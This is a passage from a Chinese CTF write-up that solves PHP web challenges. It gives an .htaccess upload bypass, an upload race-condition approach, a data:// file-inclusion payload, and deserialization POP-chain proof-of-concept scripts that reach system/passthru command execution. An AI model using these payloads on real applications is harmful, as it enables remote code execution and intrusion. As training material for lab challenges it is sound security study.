class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">------WebKitFormBoundary777cSAzvrol9Smxg--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后传一个jpg文件，内容为<code>&lt;?php phpinfo();?&gt;</code>，访问发现可以解析，那后面也是正常换恶意代码就行</p>
<h2 id="15-第十五章-归真关·竞时净魔"><a href="#15-第十五章-归真关·竞时净魔" class="headerlink" title="15 第十五章 归真关·竞时净魔"></a><strong>15 第十五章 归真关·竞时净魔</strong></h2><h3 id="文件上传RCE-条件竞争"><a href="#文件上传RCE-条件竞争" class="headerlink" title="#文件上传RCE+条件竞争"></a>#文件上传RCE+条件竞争</h3><p>省流：图片上传至&#x2F;uploads</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">归真关规则</span><br><span class="line">仅受天道认可的「净化符文」可修复玉魄（扩展名：.jpg/.png/.gif）</span><br><span class="line">符文尺寸不得大于三寸（30000字节）</span><br><span class="line">符文上传后将进行「重命名净化」</span><br><span class="line">魔气会快速清除违规符文，请把握时机！</span><br></pre></td></tr></table></figure>

<p>这样的话文件会重命名，并且还会清理文件</p>
<p>先测试一下，这次不是前端验证的后缀名，但是对文件内容没有检测，做一个内存马然后打条件竞争吧</p>
<p>做完图片马后放010看一下</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923172753103.png" alt="image-20250923172753103"></p>
<p>然后写个py脚本去进行条件竞争好一点，但是后面发现好像题目理解错了，他是接收上传文件后会移动到uploads目录下，然后再进行的检测，如果检测通过就会重命名文件，否则就会删除文件，既然这样的话那直接传一个php文件，在他移动到uploads目录之后访问他并解析执行命令</p>
<h2 id="16-第十六章-昆仑星途"><a href="#16-第十六章-昆仑星途" class="headerlink" title="16 第十六章 昆仑星途"></a><strong>16 第十六章 昆仑星途</strong></h2><h3 id="php文件包含"><a href="#php文件包含" class="headerlink" title="#php文件包含"></a>#php文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>附件里有一个php.ini配置文件</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[PHP]</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure>

<p>可以打文件包含，直接用data伪协议</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://plain/text,<span class="meta">&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a><strong>17 第十七章 星骸迷阵·神念重构</strong></h2><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="#php反序列化"></a>#php反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单，直接给poc了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<h2 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a><strong>18 第十八章 万卷诡阁·功法连环</strong></h2><h3 id="php反序列化-1"><a href="#php反序列化-1" class="headerlink" title="#php反序列化"></a>#php反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name -&gt; name = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<h2 id="19-第十九章-星穹真相·补天归源"><a href="#19-第十九章-星穹真相·补天归源" class="headerlink" title="19 第十九章 星穹真相·补天归源"></a><strong>19 第十九章 星穹真相·补天归源</strong></h2><h3 id="php反序列化-2"><a href="#php反序列化-2" class="headerlink" title="#php反序列化"></a>#php反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable">$age</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$this</span>-&gt;age . <span class="variable">$this</span>-&gt;name,<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$age</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先找出口方法，应该就是<code>__Check</code>方法，这里的话一开始看有点绕，但是其实每个子类的成员变量都是独立的，即使他们继承于同一个父类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PersonA::<span class="title function_ invoke__">__destruct</span>()-&gt;PersonC::<span class="title function_ invoke__">__Check</span>()</span><br></pre></td></tr></table></figure>

<p>看到<code>__Check</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$this</span>-&gt;age . <span class="variable">$this</span>-&gt;name,<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    <span class="variable">$name</span>(<span class="variable">$age</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话需要注意<code>$age</code>和<code>$this-&gt;age</code>分别代表的是不同的内容，例如我们这里写了poc</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250924154223391.png" alt="image-20250924154223391"></p>
<p>可以看到此时age的值是空的，此外需要注意换一下php的环境，<code>str_contains</code>是php8新增的函数，用于判断字段中是否包含某个字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#PersonA::__destruct()-&gt;PersonC::__Check()</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; id = <span class="string">&quot;__Check&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; age = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; name -&gt; name = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; name -&gt; age = <span class="string">&quot;111&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这里的话不需要在意<code>__wakeup()</code>的问题，因为我们PersonC中的$name并没有赋值为一个对象，所以不会跳到父类的invoke中，而是正常走到<code>__destruct</code></p>
<h2 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a><strong>19 第十九章_revenge</strong></h2><h3 id="php反序列化-3"><a href="#php反序列化-3" class="headerlink" title="#php反序列化"></a>#php反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable language_">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$age</span> == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Age can&#x27;t be empty.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>(<span class="variable">$age</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次的话还是有变化的，check函数中加了一个对name和age的检测，invoke的话移到PersonB中了，不过打法其实没区别，system的话绕过就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#PersonA::__destruct()-&gt;PersonC::check()</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; id = <span class="string">&quot;check&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; age = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; name -&gt;name = <span class="string">&quot;passthru&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="20-第二十章-幽冥血海·幻语心魔"><a href="#20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="20 第二十章 幽冥血海·幻语心魔"></a><strong>20 第二十章 幽冥血海·幻语心魔</strong></h2><h3 id="SSTI无过滤"><a href="#SSTI无过滤" class="headerlink" title="#SSTI无过滤"></a>#SSTI无过滤</h3><p>看到附件有一个templates，猜测是ssti了</p>
